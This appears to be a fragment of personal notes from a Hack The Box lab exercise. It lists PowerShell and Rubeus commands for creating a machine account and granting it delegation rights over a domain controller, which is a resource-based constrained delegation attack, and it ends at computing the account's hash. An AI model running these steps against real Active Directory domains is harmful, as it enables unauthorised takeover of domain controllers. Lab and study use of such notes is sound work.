...
- Create computers - Steps
  - Get-DomainObject -Identity 'DC=NAME,DC=HTB'
    - search *ms-ds-machineaccountquota*
  
  - Get-DomainController - OSVersion
  
  - New-MachineAccount -MachineAccount NAME -Password $(ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force) = create computer
  
  - New-MachineAccount -MachineAccount (Get-Variable -Name "NAME").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

  - Get-DomainComputer NAME | select -expand objectsid
  
  - Give delegation priviliges
    - Set-ADComputer (Get-Variable -Name VARIABLENAME_PC).Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name VARIABLENAME_DC).Value + '$')
  
  - Check if it works
    - Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount

  - Rubeus.exe = login
    - Rubeus.exe hash /password:password /user:NAME /domain:support.htb = find hash rc4_hmac
    - fetch hash
